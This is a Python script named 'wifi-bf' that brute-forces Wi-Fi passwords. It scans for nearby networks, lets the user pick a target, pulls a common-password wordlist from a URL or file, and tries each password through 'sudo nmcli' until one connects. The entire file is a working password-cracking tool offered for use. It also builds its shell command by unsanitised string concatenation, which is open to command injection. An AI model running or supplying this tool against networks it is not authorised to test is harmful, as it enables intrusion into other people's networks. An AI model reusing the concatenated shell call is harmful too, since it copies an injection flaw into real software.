import argparse
import os
from ssid import start
import urllib.request
import sys
import time

# service NetworkManager restart


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


"""
    This function cutlize the argparse which gives a description of the program and
    the list of arguments supported
"""


def argument_parser():
    parser = argparse.ArgumentParser(
        prog="wifi-bf",
        description="Brute force wifi password with python 3"
    )

    parser.add_argument(
        '-u', '--url',
        type=str,
        default=None,
        help='The url that contains the list of passwords'
    )
    parser.add_argument(
        '-f', '--file',
        type=str,
        default=None,
        help='The file that contains the list of passwords'
    )

    return parser.parse_args()


"""
	This functions returns a list of passwords from a url
"""


def fetch_password_from_url(url):
    try:
        return urllib.request.urlopen(url)
    except:
        sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)


"""
	This functions checks whether the user is running the program as root. If the user is not a root,
	an error message is displayed and the program exit
"""


def require_root():
    r = os.popen("whoami").read()
    if (r.strip() != "root"):
        print("Run it as root.")
        sys.exit(-1)


"""
	This functions shows the user the list of targets
"""


def display_targets(networks):
    print("Select a target: \n")
    for i in range(len(networks)):
        print(str(i+1)+". "+networks[i])


"""
	This functions prompt the user to enter the target choice and returns the choice.
	The function runs in a loop until the user enter the correct target
"""


def prompt_for_target_choice(max):
    while True:
        try:
            selected = int(input("\nEnter number of target: "))
            if(selected >= 1 and selected <= max):
                return selected - 1
        except Exception as e:
            ignore = e

        print("Invalid choice: Please pick a number between 1 and " + str(max))


"""
	This function takes the targeted network and list of password and attempt to brute force it.
"""


def brute_force(selected_network, passwords):
    for password in passwords:
        # necessary due to NetworkManager restart after unsuccessful attempt at login
        password = password.strip()

        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
        if isinstance(password, str):
            decoded_line = password
        else:
            decoded_line = password.decode("utf-8")

        print(bcolors.HEADER+"** TESTING **: with password '" +
              decoded_line+"'"+bcolors.ENDC)

        if (len(decoded_line) >= 8):
            time.sleep(3)

            creds = os.popen("sudo nmcli dev wifi connect " +
                             selected_network+" password "+decoded_line).read()
            # print(creds)

            if ("Error:" in creds.strip()):
                print(bcolors.FAIL+"** TESTING **: password '" +
                      decoded_line+"' failed."+bcolors.ENDC)
            else:
                sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
                         decoded_line+"' succeeded."+bcolors.ENDC)
        else:
            print(bcolors.OKCYAN+"** TESTING **: password '" +
                  decoded_line+"' too short, passing."+bcolors.ENDC)

    print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)


"""
	The main function
"""


def main():
    require_root()
    args = argument_parser()

    # The user chose to supplied their own url
    if args.url is not None:
        passwords = fetch_password_from_url(args.url)
    # user elect to read passwords form a file
    elif args.file is not None:
        file = open(args.file, "r")
        passwords = file.readlines()
        if not passwords:
            print("Password file cannot be empty!")
            exit(0)
        file.close()
    else:
        # fallback to the default list as the user didnt supplied a password list
        default_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
        passwords = fetch_password_from_url(default_url)

    # grabbing the list of the network ssids
    networks = start(1)
    if not networks:
        print("No networks found!")
        sys.exit(-1)

    display_targets(networks)
    max = len(networks)
    pick = prompt_for_target_choice(max)
    target = networks[pick]

    brute_force(target, passwords)


main()
